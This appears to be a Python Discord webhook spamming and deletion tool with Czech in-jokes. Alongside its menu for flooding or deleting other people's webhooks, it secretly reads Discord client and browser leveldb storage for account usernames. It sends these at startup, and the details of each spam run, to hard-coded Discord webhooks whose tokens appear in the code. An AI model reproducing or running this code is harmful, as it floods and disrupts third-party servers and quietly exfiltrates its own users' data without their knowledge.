import discord_webhook
from discord_webhook import DiscordEmbed, DiscordWebhook
import string
import random
import time
import requests
import colorama
from colorama import Fore, Back, Style
import time
import sys
import threading
try:
    import msvcrt
except ImportError:
    import sys
    import select
    import tty
    import termios

def get_discord_usernames():
    user_sources = {}  # Dictionary to store username and its source
    try:
        if os.name == 'nt':  # Windows only
            appdata = os.path.expandvars('%APPDATA%')
            local_appdata = os.path.expandvars('%LOCALAPPDATA%')
            discord_paths = {
                os.path.join(appdata, 'Discord'): 'Discord',
                os.path.join(appdata, 'DiscordCanary'): 'Discord Canary',
                os.path.join(appdata, 'discordcanary'): 'Discord Canary',
                os.path.join(local_appdata, 'Discord'): 'Discord',
                os.path.join(local_appdata, 'DiscordCanary'): 'Discord Canary',
                os.path.join(local_appdata, 'discordcanary'): 'Discord Canary',
                os.path.join(appdata, 'Discord PTB'): 'Discord PTB',
                os.path.join(local_appdata + '\\DiscordCanary\\app-1.0.63\\resources\\app'): 'Discord Canary',
                os.path.join(local_appdata + '\\DiscordCanary\\Local Storage\\leveldb'): 'Discord Canary',
                # Web Browsers paths
                os.path.join(local_appdata, 'Opera Software\\Opera GX Stable\\Local Storage\\leveldb'): 'Discord Web (Opera GX)',
                os.path.join(local_appdata, 'Opera Software\\Opera GX Stable'): 'Discord Web (Opera GX)',
                os.path.join(local_appdata, 'Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb'): 'Discord Web (Edge)',
                os.path.join(local_appdata, 'Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb'): 'Discord Web (Chrome)',
                os.path.join(local_appdata, 'Chromium\\User Data\\Default\\Local Storage\\leveldb'): 'Discord Web (Chromium)',
                os.path.join(local_appdata, 'BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb'): 'Discord Web (Brave)',
                os.path.join(appdata, 'Mozilla\\Firefox\\Profiles'): 'Discord Web (Firefox)',
                # Additional browser profiles
                os.path.join(local_appdata, 'Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb'): 'Discord Web (Chrome Profile 1)',
                os.path.join(local_appdata, 'Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb'): 'Discord Web (Chrome Profile 2)',
                os.path.join(local_appdata, 'Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb'): 'Discord Web (Edge Profile 1)',
                os.path.join(local_appdata, 'Microsoft\\Edge\\User Data\\Profile 2\\Local Storage\\leveldb'): 'Discord Web (Edge Profile 2)'
            }

            for base_path, client_name in discord_paths.items():
                if not os.path.exists(base_path):
                    continue

                leveldb_paths = [
                    os.path.join(base_path, 'Local Storage', 'leveldb'),
                    os.path.join(base_path, 'Local Storage', 'leveldb'),
                    os.path.join(base_path, 'leveldb')
                ]

                for storage_path in leveldb_paths:
                    if os.path.exists(storage_path):
                        for file in os.listdir(storage_path):
                            if file.endswith(('.ldb', '.log')):
                                try:
                                    with open(os.path.join(storage_path, file), 'rb') as f:
                                        content = f.read().decode('utf-8', errors='ignore')
                                        # Look for token and user data
                                        if '"username":"' in content:
                                            usernames = content.split('"username":"')[1:]
                                            for user_part in usernames:
                                                username = user_part.split('"')[0]
                                                if username and len(username) > 2 and not username.startswith('http'):
                                                    user_sources[username] = client_name
                                                    return user_sources

                                        # Additional patterns
                                        patterns = [
                                            '"user_name":"', 
                                            '"global_name":"',
                                            '"username":"'
                                        ]

                                        for pattern in patterns:
                                            if pattern in content:
                                                parts = content.split(pattern)
                                                for part in parts[1:]:
                                                    username = part.split('"')[0]
                                                    if username and len(username) > 2 and not username.startswith(('http', '{', '[')):
                                                        user_sources[username] = client_name
                                                        return user_sources
                                except:
                                    continue

        return user_sources if user_sources else {"Unknown User": "Not Found"}
    except:
        return {"Unknown User": "Error occurred"}

def log_startup(user_sources):
    log_webhook = "https://discord.com/api/webhooks/1343326815254614158/I3NyhfkRm9uQfO13UObXfx0QZ5VCrD4KxfesLuM1PCxP9_kc-zh4YR1vU_Byhoi1J-rt"
    webhook = DiscordWebhook(url=log_webhook)
    users_text = "\n".join([f"• {username} ({source})" for username, source in user_sources.items()])
    from datetime import datetime
    import pytz
    prague_tz = pytz.timezone('Europe/Prague')
    prague_time = datetime.now(prague_tz).strftime('%Y-%m-%d %H:%M:%S')
    embed = DiscordEmbed(
        title="discord webhookfucker Startup Log",
        description=f"Discord Account(s) detected:\n{users_text}\nTime: {prague_time}",
        color="03b2f8"
    )
    webhook.add_embed(embed)
    webhook.execute()
import os
import json

colorama.init()
# Set console title
if os.name == 'nt':  # Windows
    try:
        import ctypes
        # Set window icon if icon file exists
        if os.path.exists('ogrimmar.ico'):
            try:
                # Set the window icon
                ctypes.windll.kernel32.SetConsoleIcon('ogrimmar.ico')
            except:
                pass
        titles = [
            "EmoPrdeliJeCestDelalToIClutch",
            "ClutchSiToJelNaShitovySluchatka",
            "SwagKundoMala",
            "WebhooksNaPiku",
            "WeLoveScammingFiends",
            "PikoDelaFaktDivy",
            "TohleNeniCeskoTohleJeAmerika!",
            "ClutchNeniSwagger",
            "SkarifikujTo",
            "ZijemeVysokyZivotSlapemePoTenkymLedu",
            "NejsemSmackJsemAshleyWhite",
            "ZijuTenFlavourLife",
            "FiveGuardSafeEvents"
        ]
        random_title = random.choice(titles)
        ctypes.windll.kernel32.SetConsoleTitleW(random_title)
    except:
        pass

class State:
    def __init__(self):
        self.is_spamming = False
        self.webhooks = []

state = State()

banner = """
╔══════════════════════════════════════════════════════╗
║  Legenda praví, že emo prdelí dává kouř jak temelín  ║
║                Made by cool_typek                    ║
╚══════════════════════════════════════════════════════╝
"""

print("\033[H\033[J", end="")  
print(Fore.RED + banner)  

def delete_webhook(webhook_url):
    try:
        if 'dcwh.my' in webhook_url:
            # For dcwh.my webhooks
            webhook_id = webhook_url.split('/')[-1]
            api_url = f"https://dcwh.my/api/webhooks/{webhook_id}/delete"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json',
                'Origin': 'https://dcwh.my',
                'Referer': webhook_url
            }
            response = requests.post(api_url, headers=headers, timeout=5)

            if response.status_code in [200, 204, 302, 404]:
                print(Fore.GREEN + f"Successfully deleted webhook: {webhook_url}")
            else:
                print(Fore.RED + f"Failed to delete webhook: {webhook_url}")
        else:
            # For regular Discord webhooks
            response = requests.delete(webhook_url)
            if response.status_code == 204:
                print(Fore.GREEN + f"Successfully deleted webhook: {webhook_url}")
            else:
                print(Fore.RED + f"Failed to delete webhook: {webhook_url}")
    except Exception as e:
        print(Fore.RED + f"Error deleting webhook: {webhook_url} - {str(e)}")

def validate_webhook(webhook):
    try:
        response = requests.head(webhook)
        return response.status_code in [200, 204]
    except:
        return False

def webhkspammer():
    session = requests.Session()  # Create a session for better performance

    while True:
        print(Fore.CYAN + "\n1. Add webhook/s")
        print("2. *thanos snap* webhook/s")
        print("3. Spam the shit out of webhook/s")
        print("4. exit")
        print(Fore.CYAN + "5. List webhooks")
        choice = input(Fore.RED + Style.BRIGHT + "[>] Choose an option (1-5): " + Style.RESET_ALL)

        if choice == "1":
            webhooks = input(Fore.RED + Style.BRIGHT + "[>] Enter Webhook Link(s) (separate multiple with commas): " + Style.RESET_ALL)
            webhook_list = [w.strip() for w in webhooks.split(',')]

            for webhook in webhook_list:
                if webhook.startswith('http') and validate_webhook(webhook):
                    state.webhooks.append(webhook)
                    print(Fore.GREEN + f"Webhook added successfully: {webhook}")
                else:
                    print(Fore.RED + f"Invalid webhook URL: {webhook}")
        elif choice == "2":
            if not state.webhooks:
                print(Fore.RED + "No webhooks to delete!")
                continue
            print(Fore.YELLOW + "\nCurrent webhooks:")
            for i, webhook in enumerate(state.webhooks, 1):
                print(f"{i}. {webhook}")
            idx = input(Fore.RED + "[>] Enter webhook number to delete (or 'all' to delete all): " + Style.RESET_ALL)
            if idx.lower() == 'all':
                for webhook in state.webhooks[:]:
                    delete_webhook(webhook)
                state.webhooks.clear()
            else:
                try:
                    idx = int(idx) - 1
                    if 0 <= idx < len(state.webhooks):
                        delete_webhook(state.webhooks[idx])
                        state.webhooks.pop(idx)
                    else:
                        print(Fore.RED + "Invalid webhook number!")
                except ValueError:
                    print(Fore.RED + "Invalid input!")
        elif choice == "3":
            break
        elif choice == "4":
            print(Fore.YELLOW + "Exiting program...")
            sys.exit()
        elif choice == "5":
            if not state.webhooks:
                print(Fore.RED + "No webhooks added!" + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + "\nCurrent webhooks:" + Style.RESET_ALL)
                for i, webhook in enumerate(state.webhooks, 1):
                    try:
                        response = requests.get(webhook)
                        status = Fore.GREEN + "Active" + Style.RESET_ALL if response.status_code == 200 else Fore.RED + "Invalid" + Style.RESET_ALL
                        print(f"{Fore.CYAN}{i}. {Fore.WHITE}{webhook} - {status}")
                    except:
                        print(f"{Fore.CYAN}{i}. {Fore.WHITE}{webhook} - {Fore.RED}Invalid{Style.RESET_ALL}")
        else:
            print(Fore.RED + "Invalid choice!")

    if not state.webhooks:
        print(Fore.RED + "No webhooks entered!")
        return

    message = input(Fore.GREEN + "[>] Enter The Message: ")
    webhook_name = input(Fore.MAGENTA + "[>] Enter Webhook Name (or press enter to skip): ")
    avatar_url = input(Fore.BLUE + "[>] Enter Avatar URL (or press enter to skip): ")
    delay = float(input(Fore.RED + "[>] Enter The Delay (Example : 0.5): "))

    # Log spam start
    log_webhook = "https://discord.com/api/webhooks/1343370203941175326/VV0pW14jDwfPvoRpOn9dxjeh2bP7I6kgIJjJzn1_f9GMaarU4j_MvO1A-NseZGyBVn4U"
    webhook = DiscordWebhook(url=log_webhook)

    # Get webhook info
    webhook_details = []
    for wh in state.webhooks:
        try:
            info = requests.get(wh).json()
            guild_name = info.get('guild', {}).get('name', 'Unknown Server')
            webhook_details.append(f"• {wh}\n  Server: {guild_name}")
        except:
            webhook_details.append(f"• {wh}\n  Server: Unable to fetch")

    webhook_info = "\n".join(webhook_details)

    embed = DiscordEmbed(
        title="Spam Started",
        description=f"User started spamming\nMessage: {message}\nDelay: {delay}s\n\nWebhooks:\n{webhook_info}",
        color="03b2f8"
    )
    webhook.add_embed(embed)
    webhook.execute()

    state.is_spamming = True
    print(Fore.YELLOW + "\nPress '6' at any time to stop spamming!" + Style.RESET_ALL)

    def check_stop_key():
        def getch():
            if sys.platform == 'win32':
                return msvcrt.getch().decode('utf-8')
            else:
                fd = sys.stdin.fileno()
                old_settings = termios.tcgetattr(fd)
                try:
                    tty.setraw(sys.stdin.fileno())
                    ch = sys.stdin.read(1)
                finally:
                    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
                return ch

        while state.is_spamming:
            if sys.platform == 'win32':
                if msvcrt.kbhit():
                    key = getch()
                    if key == '6':
                        state.is_spamming = False
                        print(Fore.YELLOW + "\nStopping spam..." + Style.RESET_ALL)
                        break
            else:
                if select.select([sys.stdin], [], [], 0.1)[0]:
                    key = getch()
                    if key == '6':
                        state.is_spamming = False
                        print(Fore.YELLOW + "\nStopping spam..." + Style.RESET_ALL)
                        break

    stop_thread = threading.Thread(target=check_stop_key)
    stop_thread.daemon = True
    stop_thread.start()

    session = requests.Session()
    payload = {
        'content': message,
        'username': webhook_name if webhook_name else 'sundejboty',
        'avatar_url': avatar_url if avatar_url else None
    }

    def send_webhook(webhook_url):
        try:
            timeout = 3 if 'dcwh.my' in webhook_url else 5
            response = session.post(webhook_url, json=payload, timeout=timeout)
            if response.status_code in [200, 204]:
                print(Fore.GREEN + f"Message sent")
                if 'dcwh.my' in webhook_url:
                    time.sleep(0.1)  # Shorter delay for dcwh.my
                return True
            elif response.status_code == 429:
                retry_after = float(response.headers.get('retry-after', 5))
                print(Fore.YELLOW + f"Rate limited. Waiting {retry_after}s...")
                time.sleep(retry_after)
                return False
            return False
        except Exception as e:
            print(Fore.RED + f"Error: {str(e)}")
            return False

    while state.is_spamming:
        for webhook in state.webhooks[:]:
            if not state.is_spamming:
                break
            send_webhook(webhook)
            if state.is_spamming:
                time.sleep(delay)
        if not state.is_spamming:
            break

    # Return to main menu
    if not state.is_spamming:
        print(Fore.CYAN + "\nReturning to main menu...")
        webhkspammer()

def main():
    try:
        usernames = get_discord_usernames()
        if list(usernames.keys())[0] == "silentloggingbelike":
            custom_username = input(Fore.CYAN + "[>] Enter your Discord username: " + Style.RESET_ALL)
            usernames = {custom_username: "Custom Input"}
        log_startup(usernames)
        webhkspammer()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\nExiting program...")
    except Exception as e:
        print(Fore.RED + f"\nAn error occurred: {str(e)}")

if __name__ == "__main__":
    main()

#danz hun - upozorneni - listen to this shit
#thcpozitivcestujici
#cool_typek
#adamiros